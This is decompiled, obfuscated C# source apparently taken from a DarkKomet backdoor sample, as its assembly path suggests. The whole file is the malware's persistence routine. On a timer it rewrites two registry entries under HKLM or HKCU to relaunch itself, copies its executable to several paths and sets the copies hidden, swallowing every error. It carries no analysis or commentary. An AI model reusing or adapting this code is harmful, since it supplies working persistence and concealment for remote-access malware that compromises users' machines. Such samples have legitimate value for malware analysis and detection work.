// Decompiled with JetBrains decompiler
// Type:  
// Assembly: AudioHD, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C44212F0-6FD7-4886-BEB4-F43F84F3B277
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Backdoor.Win32.DarkKomet.hzfh-26a1c6d83f8e03a282b89acec8aef19eabb2f72745381a243a94811e2d7d3cb6.exe

using Microsoft.Win32;
using System.Diagnostics;
using System.IO;
using System.Timers;

internal sealed class \u0008\u2001
{
  private Timer \u0002 = new Timer();
  private RegistryKey \u0003;
  private string \u0005 = Process.GetCurrentProcess().MainModule.FileName;

  public void \u0002()
  {
    this.\u0002.Interval = (double) (\u0005\u2001.\u0002.\u0003\u2003 * 1000);
    this.\u0002.Elapsed += new ElapsedEventHandler(this.\u0002);
    this.\u0002.Start();
  }

  public void \u0003()
  {
    this.\u0002.Stop();
    this.\u0002.Dispose();
  }

  private void \u0002(object _param1, ElapsedEventArgs _param2)
  {
    if (\u0005\u2001.\u0002.\u000E\u2003)
    {
      try
      {
        this.\u0003 = Registry.LocalMachine.OpenSubKey(\u0006\u2002.\u0002(-885877818), true);
        if (this.\u0003.Equals((object) \u0005\u2001.\u0002.\u0003\u2002[0]))
        {
          if (this.\u0003.GetValue(\u0005\u2001.\u0002.\u0003\u2002[0]).ToString() != '"'.ToString() + \u0005\u2001.\u0002.\u0005\u2002[0] + (object) '"')
            this.\u0003.SetValue(\u0005\u2001.\u0002.\u0003\u2002[0], (object) ('"'.ToString() + \u0005\u2001.\u0002.\u0005\u2002[0] + (object) '"'));
        }
        else
          this.\u0003.SetValue(\u0005\u2001.\u0002.\u0003\u2002[0], (object) ('"'.ToString() + \u0005\u2001.\u0002.\u0005\u2002[0] + (object) '"'));
      }
      catch
      {
      }
      try
      {
        this.\u0003 = Registry.LocalMachine.OpenSubKey(\u0006\u2002.\u0002(-885878254), true);
        if (this.\u0003.Equals((object) \u0005\u2001.\u0002.\u0003\u2002[1]))
        {
          if (this.\u0003.GetValue(\u0005\u2001.\u0002.\u0003\u2002[1]).ToString() != '"'.ToString() + \u0005\u2001.\u0002.\u0005\u2002[1] + (object) '"')
            this.\u0003.SetValue(\u0005\u2001.\u0002.\u0003\u2002[1], (object) ('"'.ToString() + \u0005\u2001.\u0002.\u0005\u2002[1] + (object) '"'));
        }
        else
          this.\u0003.SetValue(\u0005\u2001.\u0002.\u0003\u2002[1], (object) ('"'.ToString() + \u0005\u2001.\u0002.\u0005\u2002[1] + (object) '"'));
      }
      catch
      {
      }
    }
    else
    {
      try
      {
        this.\u0003 = Registry.CurrentUser.OpenSubKey(\u0006\u2002.\u0002(-885877818), true);
        if (this.\u0003.Equals((object) \u0005\u2001.\u0002.\u0003\u2002[0]))
        {
          if (this.\u0003.GetValue(\u0005\u2001.\u0002.\u0003\u2002[0]).ToString() != '"'.ToString() + \u0005\u2001.\u0002.\u0005\u2002[0] + (object) '"')
            this.\u0003.SetValue(\u0005\u2001.\u0002.\u0003\u2002[0], (object) ('"'.ToString() + \u0005\u2001.\u0002.\u0005\u2002[0] + (object) '"'));
        }
        else
          this.\u0003.SetValue(\u0005\u2001.\u0002.\u0003\u2002[0], (object) ('"'.ToString() + \u0005\u2001.\u0002.\u0005\u2002[0] + (object) '"'));
      }
      catch
      {
      }
      try
      {
        this.\u0003 = Registry.CurrentUser.OpenSubKey(\u0006\u2002.\u0002(-885878254), true);
        if (this.\u0003.Equals((object) \u0005\u2001.\u0002.\u0003\u2002[1]))
        {
          if (this.\u0003.GetValue(\u0005\u2001.\u0002.\u0003\u2002[1]).ToString() != '"'.ToString() + \u0005\u2001.\u0002.\u0005\u2002[1] + (object) '"')
            this.\u0003.SetValue(\u0005\u2001.\u0002.\u0003\u2002[1], (object) ('"'.ToString() + \u0005\u2001.\u0002.\u0005\u2002[1] + (object) '"'));
        }
        else
          this.\u0003.SetValue(\u0005\u2001.\u0002.\u0003\u2002[1], (object) ('"'.ToString() + \u0005\u2001.\u0002.\u0005\u2002[1] + (object) '"'));
      }
      catch
      {
      }
    }
    try
    {
      foreach (string str in \u0005\u2001.\u0002.\u0005\u2002)
      {
        if (!\u0005\u2001.\u0003.\u0003(str))
        {
          File.Copy(this.\u0005, str, true);
          File.SetAttributes(str, FileAttributes.Hidden);
        }
      }
    }
    catch
    {
    }
  }
}
